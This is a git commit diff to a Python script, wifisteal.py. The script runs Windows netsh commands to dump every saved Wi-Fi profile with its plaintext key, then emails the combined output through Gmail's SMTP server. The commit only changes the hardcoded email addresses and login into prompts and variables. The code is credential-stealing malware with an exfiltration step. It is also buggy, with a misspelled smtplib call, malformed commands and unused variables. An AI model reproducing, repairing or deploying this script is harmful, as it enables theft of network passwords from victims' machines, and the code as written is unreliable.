46c0f0729f822750c7551163fd641e32adde0741
darkarrow428 <52023592+darkarrow428@users.noreply.github.com>
2020-04-04 21:12:04 +0530

    Update wifisteal.py

--- wifisteal.py
+++ wifisteal.py
@@ -11,13 +11,13 @@ for network in network_list:
 	command2 = "netsh wlan show profile" + network + "key=clear"
 	one_network_result = subprocess.check_output(command2, shell=True)
 	final_output += one_network_result
-Email = raw_input("Enter Email to Send to :")
-password = raw_input("Enter Email to Send to :")
+Email1 = raw_input("Enter Email to Send to :")
+Email2 = raw_input("Enter Email to Send to :")
 
 server = smtplib.smpt("smtp.gmail.com", 587)
 server.starttls()
-server.login("windows32@gmail.com"," Test1234")
-server.sendmail("windows32w@gmail.com"," windows32@gmail.com", final_output)
+server.login("Email","password")
+server.sendmail("Email1","Email2", final_output)
 
 
 server.quit()
